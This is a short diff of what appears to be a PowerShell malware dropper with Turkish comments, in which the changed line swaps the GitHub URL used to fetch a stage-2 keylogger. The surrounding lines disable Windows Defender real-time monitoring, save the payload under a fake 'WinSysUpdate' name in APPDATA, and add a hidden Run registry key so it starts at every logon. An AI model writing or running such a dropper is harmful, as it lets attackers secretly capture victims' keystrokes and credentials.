@@ -5,7 +5,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 $path = "$env:APPDATA\WinSysUpdate.ps1"
 
 # 3. Stage-2'yi (Keylogger) GitHub'dan hedefin diskine indir
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Muzoovy4606/keylogger/refs/heads/main/keylogger.ps1' -OutFile $path
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Muzoovy4606/keylogger/refs/heads/main/keylogcu.ps1' -OutFile $path
 
 # 4. Kalicilik (Persistence) Sagla - Bilgisayar acilisinda otomatik baslamasi icin Registry'ye ekle
 New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WinSysUpdate' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path" -PropertyType String -Force
